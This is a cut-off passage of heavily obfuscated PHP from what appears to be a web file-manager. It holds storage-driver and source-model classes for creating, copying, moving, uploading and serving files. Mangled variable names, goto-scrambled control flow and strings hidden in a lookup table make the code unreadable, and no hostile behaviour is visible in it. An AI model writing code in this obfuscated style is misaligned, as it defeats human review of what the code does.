$Eá’Ë­¡·; goto eˆ§ãµ—ìÂ; CÊÄ—¾¹õ¿: if ($Eá’Ë­¡·) { return $Eá’Ë­¡·; } if ($d„Õë³ŞÀ… == $C’¯”¥’ƒØ[1083]) { $Eá’Ë­¡· = self::make(Model($C’¯”¥’ƒØ[754])->systemRootPathAdd($C’¯”¥’ƒØ[1092])); } else { $Eá’Ë­¡· = self::systemPath($C’¯”¥’ƒØ[1083]); $FÙÅÅÆç¥— = self::sourceID($Eá’Ë­¡·); $Eá’Ë­¡· = self::make(Model($C’¯”¥’ƒØ[754])->mkdir($FÙÅÅÆç¥—, $d„Õë³ŞÀ…)); } Model($C’¯”¥’ƒØ[1091])->set($bªĞÁÇóÃ, $Eá’Ë­¡·); goto E±‚µŒ¦“Ò; eˆ§ãµ—ìÂ: } public static function systemFolder($Dš…ò¬ÌÇ…) { $CÛì§¥Çˆ = IO_PATH_SYSTEM_SOURCE . $Dš…ò¬ÌÇ…; $eÓªÓÎÔˆ = Cache::get($CÛì§¥Çˆ); if (!$eÓªÓÎÔˆ) { $cÍïñÇ¡ˆ± = IO::infoFull($CÛì§¥Çˆ); if (!$cÍïñÇ¡ˆ±) { $eÓªÓÎÔˆ = IO::mkdir($CÛì§¥Çˆ, REPEAT_SKIP); } else { $eÓªÓÎÔˆ = $cÍïñÇ¡ˆ±[$_SERVER[Õİõş][75]]; } Cache::set($CÛì§¥Çˆ, $eÓªÓÎÔˆ, 3600 * 10); } return $eÓªÓÎÔˆ; } public static function defaultDriver() { return Model($_SERVER[Õİõş][706])->defaultDriver(); } public static function defaultIO() { $C×ùàÍÒ¡ =& $_SERVER[Õİõş]; $A”¸¸¯ÖÆĞ = self::defaultDriver(); return $C×ùàÍÒ¡[1093] . $A”¸¸¯ÖÆĞ[$C×ùàÍÒ¡[363]] . $C×ùàÍÒ¡[1080]; } public static function fileTypeList() { $e«ƒÎ…Šçö =& $_SERVER[Õİõş]; $C‚ËÅÖ‰ší = $GLOBALS[$e«ƒÎ…Šçö[6]][$e«ƒÎ…Šçö[1094]]; foreach ($C‚ËÅÖ‰ší as $Eíßª°ÎÎà => $a¼Öò¤Ç©‚) { $fÛ×Šéà = $e«ƒÎ…Šçö[1095] . $Eíßª°ÎÎà; $féœÔ¦ñÎ = LNG($fÛ×Šéà); if ($fÛ×Šéà != $féœÔ¦ñÎ) { $C‚ËÅÖ‰ší[$Eíßª°ÎÎà][$e«ƒÎ…Šçö[28]] = $féœÔ¦ñÎ; } } return $C‚ËÅÖ‰ší; } } class PathDriverCOS extends PathDriverBaseS3 { public function __construct($b’”‚…‰Ù) { parent::__construct($b’”‚…‰Ù); $this->signatureVersion($_SERVER[Õİõş][196]); } public function uploadFormData($eœê÷»¬•™, $aøŒø»ËìÈ = 3600) { goto e÷Ãˆ±ßé; f«â·›œˆ: $cÀÏ‰ºÃìŒ = sha1($b¹‡Œßäî²); $FÕ£êğØ = hash_hmac($A¶Š¯¢‹Š[214], $cÀÏ‰ºÃìŒ, $a…õêåØ…); $EßÔÏ„Ù¦ = array($A¶Š¯¢‹Š[1100] => $BÌ¾ ã¬Ôœ, $A¶Š¯¢‹Š[1104] => $e¦†±âêç, $A¶Š¯¢‹Š[1108] => base64_encode($b¹‡Œßäî²), $A¶Š¯¢‹Š[1105] => $dŠË‚ùÅŠ, $A¶Š¯¢‹Š[1106] => $this->accessKey, $A¶Š¯¢‹Š[1109] => $dÏŸ„®Â”¯, $A¶Š¯¢‹Š[1110] => $FÕ£êğØ, $A¶Š¯¢‹Š[165] => $this->getHost()); goto EåÏŒ‡›Ñ; EåÏŒ‡›Ñ: return $EßÔÏ„Ù¦; goto f¥—ÜŠÎÔº; D½°æêÏ«ç: $e¦†±âêç = $A¶Š¯¢‹Š[1096]; $F……Ä‚¯ùë = gmdate($A¶Š¯¢‹Š[1097], time() + $aøŒø»ËìÈ); $dÏŸ„®Â”¯ = (string) time() . $A¶Š¯¢‹Š[67] . (string) (time() + $aøŒø»ËìÈ); goto Fœ¥æÆ™³; Fœ¥æÆ™³: $b¹‡Œßäî² = array($A¶Š¯¢‹Š[1098] => $F……Ä‚¯ùë, $A¶Š¯¢‹Š[1099] => array(array($A¶Š¯¢‹Š[1100] => $BÌ¾ ã¬Ôœ), array($A¶Š¯¢‹Š[1101] => $this->bucket), array($A¶Š¯¢‹Š[1102], $A¶Š¯¢‹Š[1103], $A¶Š¯¢‹Š[33]), array($A¶Š¯¢‹Š[1104] => $e¦†±âêç), array($A¶Š¯¢‹Š[1105] => $dŠË‚ùÅŠ), array($A¶Š¯¢‹Š[1106] => $this->accessKey), array($A¶Š¯¢‹Š[1107] => $dÏŸ„®Â”¯))); $b¹‡Œßäî² = json_encode($b¹‡Œßäî²); $a…õêåØ… = hash_hmac($A¶Š¯¢‹Š[214], $dÏŸ„®Â”¯, $this->secret); goto f«â·›œˆ; e÷Ãˆ±ßé: $A¶Š¯¢‹Š =& $_SERVER[Õİõş]; $BÌ¾ ã¬Ôœ = $A¶Š¯¢‹Š[181]; $dŠË‚ùÅŠ = $A¶Š¯¢‹Š[214]; goto D½°æêÏ«ç; f¥—ÜŠÎÔº: } public function fileOutLink($FàÛ©›®ãŠ) { $aˆµ±¥²¡ =& $_SERVER[Õİõş]; if (substr($FàÛ©›®ãŠ, 0, 7) == $aˆµ±¥²¡[1111]) { $FàÛ©›®ãŠ = $aˆµ±¥²¡[1112] . substr($FàÛ©›®ãŠ, 7); } header($aˆµ±¥²¡[152] . $FàÛ©›®ãŠ); die; } } class PathDriverDB extends PathDriverBase { public $model; public $pathParse; public function __construct($c¾ åùì‡Á) { $this->pathParse = $c¾ åùì‡Á; $this->model = Model($_SERVER[Õİõş][1113]); } public function getPath($d÷ï¿”ì«’) { return trim($d÷ï¿”ì«’, $_SERVER[Õİõş][8]); } public function pathFather($A²­ÒƒÚ‹ä) { $AÑÁğ…—¸Á = $this->parse($A²­ÒƒÚ‹ä); $AÑÁğ…—¸Á = $this->infoSimple($A²­ÒƒÚ‹ä); return $AÑÁğ…—¸Á ? $AÑÁğ…—¸Á[$_SERVER[Õİõş][456]] : !1; } public function getPathName($dˆÑ®‰Òß¢) { $cÆÄ²ô•¢ = $this->infoSimple($dˆÑ®‰Òß¢); return $cÆÄ²ô•¢ ? $cÆÄ²ô•¢[$_SERVER[Õİõş][28]] : !1; } public function getPathOuter($DìÂİá¢ù‡) { if (!$DìÂİá¢ù‡) { return $DìÂİá¢ù‡; } $f¯µèˆº¡ = $this->parse($DìÂİá¢ù‡); return KodIO::make($f¯µèˆº¡[$_SERVER[Õİõş][363]]); } public function copyFolderFromIO($aĞØùìÙ¶¿, $e—Ö¸”×ã, $FƒÉçÁ‚†©, $A†ÉÅíŞŠ, $EˆöÔ©ô¦¢) { $D¬é¢èÏ²– = $this->model->copyFolderFromIO($aĞØùìÙ¶¿, $e—Ö¸”×ã, $FƒÉçÁ‚†©, $A†ÉÅíŞŠ, $EˆöÔ©ô¦¢); return KodIO::make($D¬é¢èÏ²–); } public function isParentOf($EåÂ­·ÔÕ, $e± ÙÜ«Ê‚) { return $this->model->isParentOf($EåÂ­·ÔÕ, $e± ÙÜ«Ê‚); } public function mkfile($F˜ÂøªÑËï, $eŞ†¶ºÃ¡ = '', $A¦Êğè¤¢Î = REPEAT_RENAME) { $EÔÙš‘ä¥ =& $_SERVER[Õİõş]; $E£…´í”­Ó = $this->parse($F˜ÂøªÑËï); $F˜ÂøªÑËï = $E£…´í”­Ó[$EÔÙš‘ä¥[363]]; for ($Bíª›Å¹¡¥ = 0; $Bíª›Å¹¡¥ < count($E£…´í”­Ó[$EÔÙš‘ä¥[1114]]); $Bíª›Å¹¡¥++) { $CĞÄ‡Œ‰ = $E£…´í”­Ó[$EÔÙš‘ä¥[1114]][$Bíª›Å¹¡¥]; if ($Bíª›Å¹¡¥ == count($E£…´í”­Ó[$EÔÙš‘ä¥[1114]]) - 1) { $F˜ÂøªÑËï = $this->model->mkfile($F˜ÂøªÑËï, $CĞÄ‡Œ‰, $eŞ†¶ºÃ¡, $A¦Êğè¤¢Î); break; } $F˜ÂøªÑËï = $this->model->mkdir($F˜ÂøªÑËï, $CĞÄ‡Œ‰, REPEAT_SKIP); } return $this->getPathOuter($F˜ÂøªÑËï); } public function mkdir($BËÛ‡¾²¹ğ, $Eœå‹¡Ä‡ = REPEAT_SKIP) { $fÌ–Ğàä—Ğ =& $_SERVER[Õİõş]; $BƒâÄ¿èõó = $this->parse($BËÛ‡¾²¹ğ); $BËÛ‡¾²¹ğ = $BƒâÄ¿èõó[$fÌ–Ğàä—Ğ[363]]; for ($EÀÜóÅï¹¾ = 0; $EÀÜóÅï¹¾ < count($BƒâÄ¿èõó[$fÌ–Ğàä—Ğ[1114]]); $EÀÜóÅï¹¾++) { $B„õƒçˆå = $BƒâÄ¿èõó[$fÌ–Ğàä—Ğ[1114]][$EÀÜóÅï¹¾]; $BËÛ‡¾²¹ğ = $this->model->mkdir($BËÛ‡¾²¹ğ, $B„õƒçˆå, $Eœå‹¡Ä‡); } return $this->getPathOuter($BËÛ‡¾²¹ğ); } public function copyFile($b±±íÀëÚ™, $b“©×¢œäŠ, $F¹¿à†÷° = REPEAT_REPLACE) { $a£ÇŸ…‡ßç =& $_SERVER[Õİõş]; $F™Å†¬Ÿç† = $this->parse($b“©×¢œäŠ); $e¾êŒÆ‰ = $this->model->copy($b±±íÀëÚ™, $F™Å†¬Ÿç†[$a£ÇŸ…‡ßç[363]], $F¹¿à†÷°, $F™Å†¬Ÿç†[$a£ÇŸ…‡ßç[75]]); return $e¾êŒÆ‰ ? $this->getPathOuter($e¾êŒÆ‰) : !1; } public function moveFile($FôˆÓ“…Ñí, $eŞç‘ğ•Ğ, $fÉ¬ñƒ“Ó¼ = REPEAT_REPLACE) { $eÂØ×’­‹á =& $_SERVER[Õİõş]; $cå˜öô…ë = $this->parse($eŞç‘ğ•Ğ); $bàîâÒÒÄ = $this->model->move($FôˆÓ“…Ñí, $cå˜öô…ë[$eÂØ×’­‹á[363]], $fÉ¬ñƒ“Ó¼, $cå˜öô…ë[$eÂØ×’­‹á[75]]); return $bàîâÒÒÄ ? $this->getPathOuter($bàîâÒÒÄ) : !1; } public function copy($E˜ÛÑÖÁ, $a¾°Áë¸–, $eÔÍ·ÎÓ = REPEAT_REPLACE) { $c–Ó–‰¬ñ‰ = $this->parse($a¾°Áë¸–); $D˜æ‚‚æ×º = $this->model->copy($E˜ÛÑÖÁ, $c–Ó–‰¬ñ‰[$_SERVER[Õİõş][363]], $eÔÍ·ÎÓ); return $D˜æ‚‚æ×º ? $this->getPathOuter($D˜æ‚‚æ×º) : !1; } public function move($e•éå‚Î®à, $cî´ª«ÍŠ®, $FšïÕ¯Ê• = REPEAT_REPLACE) { $fª™î½†Ëğ = $this->parse($cî´ª«ÍŠ®); $eŒ×ÜÒÓØ† = $this->model->move($e•éå‚Î®à, $fª™î½†Ëğ[$_SERVER[Õİõş][363]], $FšïÕ¯Ê•); return $eŒ×ÜÒÓØ† ? $this->getPathOuter($eŒ×ÜÒÓØ†) : !1; } public function remove($C‡—Û¹›ßù, $eõ—¦êÕ¶ˆ = true) { return $this->model->remove($C‡—Û¹›ßù, $eõ—¦êÕ¶ˆ); } public function rename($b¸Ó×ÏÏñ“, $D´›¢çğâà) { $d‘•‰àÅŒ = $this->model->rename($b¸Ó×ÏÏñ“, $D´›¢çğâà); return $d‘•‰àÅŒ ? $this->getPathOuter($b¸Ó×ÏÏñ“) : $d‘•‰àÅŒ; } public function size($dˆ“ùæ„Ÿ÷) { $CØÒè‰§ò¤ = $this->infoSimple($dˆ“ùæ„Ÿ÷); return $CØÒè‰§ò¤ ? $CØÒè‰§ò¤[$_SERVER[Õİõş][77]] : 0; } public function infoSimple($FÍ‰Ô‡ìÀ¡) { return $this->model->sourceInfo($FÍ‰Ô‡ìÀ¡); } public function info($Cé¸¹Èö‚ì) { return $this->infoParse($Cé¸¹Èö‚ì); } public function infoAuth($A¬İêÃã‚‹) { return $this->infoParse($A¬İêÃã‚‹, !1, !0); } public function infoWithChildren($dîÜ”¨”ˆ) { return $this->infoParse($dîÜ”¨”ˆ, !0); } protected function infoParse($c™âì†Ù‘, $c”¥äìÁïÁ = false, $E¸ÙôŒ•Òï = false) { if (!$c”¥äìÁïÁ) { return $this->model->pathInfo($c™âì†Ù‘, $E¸ÙôŒ•Òï); } return $this->model->pathInfoMore($c™âì†Ù‘); } public function infoFull($CÄ‡ñà¼ÎĞ) { $AäõåøÌÄŒ =& $_SERVER[Õİõş]; $Fğè×†ÉÙ = explode($AäõåøÌÄŒ[8], $CÄ‡ñà¼ÎĞ); $bé†Û¹‰¢ª = implode($AäõåøÌÄŒ[8], array_splice($Fğè×†ÉÙ, 1)); return $this->model->pathInfoByPath($Fğè×†ÉÙ[0], $bé†Û¹‰¢ª); } public function hashSimple($cå±ÓœˆÅ) { $F Àñ¶ÇäÖ =& $_SERVER[Õİõş]; $E«„¶’ËĞÊ = $this->infoWithChildren($cå±ÓœˆÅ); return $E«„¶’ËĞÊ[$F Àñ¶ÇäÖ[158]][$F Àñ¶ÇäÖ[160]]; } public function hashMd5($B•¸¦¢˜¶») { $dÌ…¬‚¶ğ… =& $_SERVER[Õİõş]; $c©·é­“¶„ = $this->infoWithChildren($B•¸¦¢˜¶»); return $c©·é­“¶„[$dÌ…¬‚¶ğ…[158]][$dÌ…¬‚¶ğ…[159]]; } public function exist($C”Ÿô­ÃÔ) { $a¹È¾È×á =& $_SERVER[Õİõş]; $eÄÂñĞˆ‚™ = $this->parse($C”Ÿô­ÃÔ); if (!$eÄÂñĞˆ‚™[$a¹È¾È×á[75]]) { return $this->isFile($C”Ÿô­ÃÔ) || $this->isFolder($C”Ÿô­ÃÔ); } $b³¡×ª¬íè = array($a¹È¾È×á[364] => $eÄÂñĞˆ‚™[$a¹È¾È×á[363]], $a¹È¾È×á[28] => $eÄÂñĞˆ‚™[$a¹È¾È×á[75]]); $a½æ©âĞìÔ = $this->model->where($b³¡×ª¬íè)->find(); return $a½æ©âĞìÔ ? !0 : !1; } public function isFile($c„›¹Ö»”) { $b‡™¿šë¬ =& $_SERVER[Õİõş]; $EéåÊØòÊ = $this->infoSimple($c„›¹Ö»”); return $EéåÊØòÊ && $EéåÊØòÊ[$b‡™¿šë¬[366]] == $b‡™¿šë¬[83] ? !1 : !0; } public function isFolder($CÉÄòäøÓİ) { $B©÷…¢‰ëœ =& $_SERVER[Õİõş]; $f«Ì†éÛ¶ = $this->infoSimple($CÉÄòäøÓİ); return $f«Ì†éÛ¶ && $f«Ì†éÛ¶[$B©÷…¢‰ëœ[366]] == $B©÷…¢‰ëœ[83] ? !0 : !1; } public function listPath($FîËÈé¨, $e”£‚”å¾Í = false) { $d©Äï‰¡‚Ô =& $_SERVER[Õİõş]; if ($FîËÈé¨ == $d©Äï‰¡‚Ô[33]) { return !1; } $a§É˜öº¥‡ = array($d©Äï‰¡‚Ô[364] => $FîËÈé¨); if ($e”£‚”å¾Í) { return $this->model->listSource($a§É˜öº¥‡, -1); } return $this->model->listSource($a§É˜öº¥‡); } public function has($Cµ¾†¿Éˆ“, $a¤«Ë‘ƒÌ½ = false, $A¸™ŞãõÏÏ = null) { $A®ê‰øÌè¦ =& $_SERVER[Õİõş]; $dÅé÷èò = $this->infoWithChildren($Cµ¾†¿Éˆ“); if ($a¤«Ë‘ƒÌ½) { return array($A®ê‰øÌè¦[188] => $dÅé÷èò[$A®ê‰øÌè¦[188]], $A®ê‰øÌè¦[187] => $dÅé÷èò[$A®ê‰øÌè¦[187]]); } return $A¸™ŞãõÏÏ ? $dÅé÷èò[$A®ê‰øÌè¦[188]] : $dÅé÷èò[$A®ê‰øÌè¦[187]]; } public function listAll($a„ “ôª¢‚) { $C¦´›óĞŠ÷ = IO::info($this->pathParse[$_SERVER[Õİõş][75]]); if (!$C¦´›óĞŠ÷) { return array(); } return $this->model->listAll($a„ “ôª¢‚); } public function getContent($cñÀäĞâé¯) { return $this->model->getContent($cñÀäĞâé¯); } public function setContent($e¤Ê­æ‘Èó, $cÀš–±Ú‡– = '') { return $this->model->setContent($e¤Ê­æ‘Èó, $cÀš–±Ú‡–); } public function fileSubstr($BÕÊ”ÊÓßï, $e°Üèªšó, $fÑèÒ”Ïª¸) { return $this->model->fileSubstr($BÕÊ”ÊÓßï, $e°Üèªšó, $fÑèÒ”Ïª¸); } public function download($f˜‘–ˆâ£ï, $Dò–³Ğ×²Î = '') { $CÈİ·²Ğ¤è = get_path_father($Dò–³Ğ×²Î); $eœ“î§¼©à = get_path_this($Dò–³Ğ×²Î); $FŸĞƒÚÂ’Ü = $this->model->fileInfoGet($f˜‘–ˆâ£ï); $AÁ¢İæ¡îÕ = IO::copy($FŸĞƒÚÂ’Ü[$_SERVER[Õİõş][75]], $CÈİ·²Ğ¤è, !1, $eœ“î§¼©à); return $AÁ¢İæ¡îÕ; } public function upload($F„…äĞ×¤‡, $d§ÃÇ‰¼š, $f È½¶‹ØÈ = false, $DĞï±æÎÌË = REPEAT_REPLACE) { $dŞ·™‚ò× =& $_SERVER[Õİõş]; $CÇµÃ·Ø­Ç = $this->parse($F„…äĞ×¤‡); $bÑ„»µÏğŠ = $this->model->addFile($CÇµÃ·Ø­Ç[$dŞ·™‚ò×[363]], $d§ÃÇ‰¼š, $CÇµÃ·Ø­Ç[$dŞ·™‚ò×[75]], $f È½¶‹ØÈ, $DĞï±æÎÌË); return $this->getPathOuter($bÑ„»µÏğŠ); } public function uploadFileByID($BÓÄ÷³‘µ®, $B£·¤Ã«±Š, $F¯•¡ ì÷») { $AÒ®±…ó«Ì =& $_SERVER[Õİõş]; $eÙ±é¸òÖ£ = $this->parse($BÓÄ÷³‘µ®); $A¦¿Ì«‹Ë· = $this->model->addFileByFileID($eÙ±é¸òÖ£[$AÒ®±…ó«Ì[363]], $B£·¤Ã«±Š, $eÙ±é¸òÖ£[$AÒ®±…ó«Ì[75]], $F¯•¡ ì÷»); return $this->getPathOuter($A¦¿Ì«‹Ë·); } public function addFileByRemote($Fé´©…ª‚ƒ, $e¢„÷ŒÎª, $F³õŒ‡°ïÃ = array(), $B×†»Í„ÏË = '', $F¤Ô ô›Á) { $A‚Æ™õ¦‹ =& $_SERVER[Õİõş]; $eáŞ„ã—šâ = $this->parse($Fé´©…ª‚ƒ); $B×†»Í„ÏË = empty($B×†»Í„ÏË) ? $eáŞ„ã—šâ[$A‚Æ™õ¦‹[75]] : $B×†»Í„ÏË; $cÖê©¼´å­ = $this->model->addFileByRemote($eáŞ„ã—šâ[$A‚Æ™õ¦‹[363]], $e¢„÷ŒÎª, $B×†»Í„ÏË, $F³õŒ‡°ïÃ, $F¤Ô ô›Á); return $this->getPathOuter($cÖê©¼´å­); } public function uploadLink($cÅÓïò”¢, $eô¾·ˆ—¬º = 0) { $bÁ‚³³š…‚ =& $_SERVER[Õİõş]; $Aœ¼‰¬£©á = $this->parse($cÅÓïò”¢); $cÅÓïò”¢ = Model($bÁ‚³³š…‚[539])->createFileName($Aœ¼‰¬£©á[$bÁ‚³³š…‚[75]]); $a­©Û „Òµ = IO::uploadLink($cÅÓïò”¢, $eô¾·ˆ—¬º); return $a­©Û „Òµ; } public function fileNameAuto($fŠ“ñ—ÕÒ¥, $eˆàŞ©‚‘, $cõğ»í˜­â = REPEAT_REPLACE, $d»‚âñŠ†× = false) { return $this->model->fileNameAuto($fŠ“ñ—ÕÒ¥, $eˆàŞ©‚‘, $cõğ»í˜­â, $d»‚âñŠ†×); } public function fileNameExist($cßÊÈœ¦ĞÃ, $Bï£™ÛôÎí) { return $this->model->fileNameExist($cßÊÈœ¦ĞÃ, $Bï£™ÛôÎí); } protected function _fileOut($CÀ´ËÅŠÈ, $d»ğäšÇ©Ì = false, $AœŒù÷Şí™ = false, $cŒ¤Ğ‰ÖÉ = '', $EŒ¸Ö²»Š¿ = false) { goto b—×çÔÈÈñ; FØÛì‡©¹ª: if ($EŒ¸Ö²»Š¿) { return IO::fileOutServer($aô«ÛˆÃƒ[$EåŸË›ßÙˆ[75]], $d»ğäšÇ©Ì, $f”ôˆİ‡î¹, $cŒ¤Ğ‰ÖÉ); } IO::fileOut($aô«ÛˆÃƒ[$EåŸË›ßÙˆ[75]], $d»ğäšÇ©Ì, $f”ôˆİ‡î¹, $cŒ¤Ğ‰ÖÉ); goto CÂš”Õƒ°½; b—×çÔÈÈñ: $EåŸË›ßÙˆ =& $_SERVER[Õİõş]; $dÍ®íÇÊ­Œ = $this->model->sourceInfo($CÀ´ËÅŠÈ); if ($dÍ®íÇÊ­Œ[$EåŸË›ßÙˆ[366]] == $EåŸË›ßÙˆ[83]) { header($EåŸË›ßÙˆ[1115]); die; } goto f“âÛ¥˜Õê; f“âÛ¥˜Õê: $aô«ÛˆÃƒ = $this->model->fileInfoGet($CÀ´ËÅŠÈ); $cŒ¤Ğ‰ÖÉ = $aô«ÛˆÃƒ[$EåŸË›ßÙˆ[159]] ? $aô«ÛˆÃƒ[$EåŸË›ßÙˆ[159]] : $cŒ¤Ğ‰ÖÉ; $f”ôˆİ‡î¹ = isset($GLOBALS[$EåŸË›ßÙˆ[1116]]) ? $GLOBALS[$EåŸË›ßÙˆ[1116]] : $dÍ®íÇÊ­Œ[$EåŸË›ßÙˆ[28]]; goto FØÛì‡©¹ª; CÂš”Õƒ°½: } public function fileOut($cá¦ÚÅ½Ë‹, $A¯ˆÓ­‹ó¨ = false, $D†¨Ä–äôò = false, $dùÑòÑö­ó = '') { $this->_fileOut($cá¦ÚÅ½Ë‹, $A¯ˆÓ­‹ó¨, $D†¨Ä–äôò, $dùÑòÑö­ó); } public function fileOutServer($D‘ßô‰ÃºÆ, $Fê©éÀ‘Åƒ = false, $e©×ó¦òßš = false, $CÃ›Œ“Êƒç = '') { $this->_fileOut($D‘ßô‰ÃºÆ, $Fê©éÀ‘Åƒ, $e©×ó¦òßš, $CÃ›Œ“Êƒç, !0); } protected function _fileOutImage($DµÃ‚ØÍ‘, $eª›Íâ£ª = 250) { $Dƒ…²øÍè =& $_SERVER[Õİõş]; $eáÔËĞÔ†Å = $this->model->sourceInfo($DµÃ‚ØÍ‘); if ($eáÔËĞÔ†Å[$Dƒ…²øÍè[366]] == $Dƒ…²øÍè[83]) { show_json($Dƒ…²øÍè[1117] . $DµÃ‚ØÍ‘, !1); } $GLOBALS[$Dƒ…²øÍè[1116]] = $eáÔËĞÔ†Å[$Dƒ…²øÍè[28]]; $dŒöƒİİğª = $this->model->fileInfoGet($DµÃ‚ØÍ‘); IO::fileOutImage($dŒöƒİİğª[$Dƒ…²øÍè[75]], $eª›Íâ£ª); } public function fileOutImage($FŸä—ß‡Ïâ, $A™Œ…Üƒï– = 250) { $this->_fileOutImage($FŸä—ß‡Ïâ, $A™Œ…Üƒï–); } public function fileOutImageServer($fÓÌô¿Í, $CğäÉÀ–Ú¤ = 250) { $this->_fileOutImage($fÓÌô¿Í, $CğäÉÀ–Ú¤); } public function link($EÀ«èÙ¸ãÅ, $bí¡ÄÎÖ×¤ = '') { $cÜÇÑœèÚÕ = $this->model->fileInfoGet($EÀ«èÙ¸ãÅ); return IO::link($cÜÇÑœèÚÕ[$_SERVER[Õİõş][75]], $bí¡ÄÎÖ×¤); } protected function parse($cİæ‹”—È) { $eé·îá¡Ñ =& $_SERVER[Õİõş]; if (strstr($cİæ‹”—È, $eé·îá¡Ñ[8]) === !1) { return array($eé·îá¡Ñ[381] => intval($cİæ‹”—È), $eé·îá¡Ñ[75] => $eé·îá¡Ñ[33], $eé·îá¡Ñ[1114] => array()); } $bò«µóÖÁ = explode($eé·îá¡Ñ[8], trim($cİæ‹”—È, $eé·îá¡Ñ[8])); if (count($bò«µóÖÁ) < 2) { show_tips($cİæ‹”—È . $eé·îá¡Ñ[1118]); } return array($eé·îá¡Ñ[381] => intval($bò«µóÖÁ[0]), $eé·îá¡Ñ[75] => $bò«µóÖÁ[1], $eé·îá¡Ñ[1114] => array_slice($bò«µóÖÁ, 1)); } } goto fó¸Èñ¯µ; BÖºˆö×Ğ¾: class SourceModel extends SourceListSearchModel { public $statusIgnoreResetSpace = false; public function userRootAdd($f«ÖßÀØœá) { $fŞ¬œ’¯ºÉ =& $_SERVER[Õİõş]; $bÏ±õß˜ = Model($fŞ¬œ’¯ºÉ[469])->where(array($fŞ¬œ’¯ºÉ[1408] => $f«ÖßÀØœá))->find(); $CÚŒ„ÅÇÊø = $this->_mkdirRoot(SourceModel::TYPE_USER, $f«ÖßÀØœá, $bÏ±õß˜[$fŞ¬œ’¯ºÉ[28]]); $this->userDesktopAdd($CÚŒ„ÅÇÊø); return $CÚŒ„ÅÇÊø; } public function userDesktopAdd($dô½Ş Š‹š) { $Cæ¤éİ¨„Ã =& $_SERVER[Õİõş]; $B§ç·Ìğï² = LNG($Cæ¤éİ¨„Ã[2295]); $C¤çÜÊßóº = $this->mkdir($dô½Ş Š‹š, $B§ç·Ìğï²); $this->metaSet($C¤çÜÊßóº, $Cæ¤éİ¨„Ã[2296], $Cæ¤éİ¨„Ã[83]); $this->metaSet($dô½Ş Š‹š, $Cæ¤éİ¨„Ã[2297], $C¤çÜÊßóº); } public function groupRootAdd($B§âäßöøÒ) { $dÅ·ê†Š“¬ =& $_SERVER[Õİõş]; $Dææ¨Àğ¿‰ = Model($dÅ·ê†Š“¬[453])->where(array($dÅ·ê†Š“¬[2152] => $B§âäßöøÒ))->find(); return $this->_mkdirRoot(SourceModel::TYPE_GROUP, $B§âäßöøÒ, $Dææ¨Àğ¿‰[$dÅ·ê†Š“¬[28]]); } public function systemRootPathAdd($F¦ã÷Ö²ñê) { if ($F¦ã÷Ö²ñê != $_SERVER[Õİõş][1092]) { return !1; } return $this->_mkdirRoot(SourceModel::TYPE_SYSTEM, 0, $F¦ã÷Ö²ñê); } public function userRootRemove($bÎŒŠóŠº) { $f­“éƒÃËå = $this->sourceRoot(SourceModel::TYPE_USER, $bÎŒŠóŠº); if (!$f­“éƒÃËå) { return; } $this->remove($f­“éƒÃËå, !1); } public function groupRootRemove($FÎØÒ»‰é¯) { $FßÎçĞŠÙ† = $this->sourceRoot(SourceModel::TYPE_GROUP, $FÎØÒ»‰é¯); if (!$FßÎçĞŠÙ†) { return; } $this->remove($FßÎçĞŠÙ†, !1); } private function _mkdirRoot($B÷¤ˆ¼Å­, $dÖê¹ã», $f•‡á²ƒò) { goto Dâøâ¹‚; BõÀ¨öó: CacheLock::unlock($f˜Ô–õ»İˆ); return $A‘¡½ÊÙõ–; goto bÊ¿†ª‹§¾; Dâøâ¹‚: $c‡™ê¨Ó =& $_SERVER[Õİõş]; $F¸¾ºõ‚ßˆ = array($c‡™ê¨Ó[364] => 0, $c‡™ê¨Ó[516] => $B÷¤ˆ¼Å­, $c‡™ê¨Ó[517] => $dÖê¹ã», $c‡™ê¨Ó[513] => 1, $c‡™ê¨Ó[518] => USER_ID, $c‡™ê¨Ó[519] => USER_ID, $c‡™ê¨Ó[514] => $c‡™ê¨Ó[33], $c‡™ê¨Ó[520] => $c‡™ê¨Ó[465], $c‡™ê¨Ó[391] => 0, $c‡™ê¨Ó[515] => 0, $c‡™ê¨Ó[415] => 0, $c‡™ê¨Ó[521] => $c‡™ê¨Ó[33]); if ($b ©ùïøÍÎ = $this->where($F¸¾ºõ‚ßˆ)->find()) { return $b ©ùïøÍÎ[$c‡™ê¨Ó[365]]; } goto c©©æ‘¹Ã; e´Æèá—¸ã: $A‘¡½ÊÙõ– = $this->add($F¸¾ºõ‚ßˆ); $e¡íù×Áô = array($c‡™ê¨Ó[522] => short_id($A‘¡½ÊÙõ–)); $this->where(array($c‡™ê¨Ó[379] => $A‘¡½ÊÙõ–))->save($e¡íù×Áô); goto BõÀ¨öó; c©©æ‘¹Ã: $f˜Ô–õ»İˆ = "\x4d\x6f\144\145\154\123\157\x75\162\x63\x65\x2e\155\x6b\x64\151\162\x52\x6f\157\x74\56{$B÷¤ˆ¼Å­}\x2e{$dÖê¹ã»}\56" . $f•‡á²ƒò; CacheLock::lock($f˜Ô–õ»İˆ); $F¸¾ºõ‚ßˆ[$c‡™ê¨Ó[28]] = $f•‡á²ƒò; goto e´Æèá—¸ã; bÊ¿†ª‹§¾: } private function sourceRoot($B¡¥ªà…í, $Eããœ¢Œã, $fÈ˜Å’«é³ = false) { $C¹ÀØ©˜è  =& $_SERVER[Õİõş]; $f‘…›åëÜ¬ = array($C¹ÀØ©˜è [364] => 0, $C¹ÀØ©˜è [516] => $B¡¥ªà…í, $C¹ÀØ©˜è [517] => $Eããœ¢Œã); if ($dœàáìÂË = $this->where($f‘…›åëÜ¬)->find()) { return $fÈ˜Å’«é³ ? $dœàáìÂË : $dœàáìÂË[$C¹ÀØ©˜è [365]]; } return !1; } public function sourceRootGroup($bàíÜ†ğø‚) { $bŸ•ĞŒ¯ˆÅ =& $_SERVER[Õİõş]; if (is_string($bàíÜ†ğø‚)) { $bàíÜ†ğø‚ = array($bàíÜ†ğø‚); } $c¬³Í‘ô…‘ = array($bŸ•ĞŒ¯ˆÅ[364] => 0, $bŸ•ĞŒ¯ˆÅ[516] => SourceModel::TYPE_GROUP, $bŸ•ĞŒ¯ˆÅ[517] => array($bŸ•ĞŒ¯ˆÅ[7], $bàíÜ†ğø‚)); $Aˆ‘†¢¤‘˜ = $this->listSource($c¬³Í‘ô…‘, 1000); return array_to_keyvalue($Aˆ‘†¢¤‘˜[$bŸ•ĞŒ¯ˆÅ[74]], $bŸ•ĞŒ¯ˆÅ[451]); } public function mkfile($d†£ÚÖ¸ƒ, $A˜™ ÷£ô«, $C¯‘Ò¸‹¬– = '', $f„ŠÎó¼İ† = REPEAT_RENAME) { $C‘‚¬‘ƒŠÔ =& 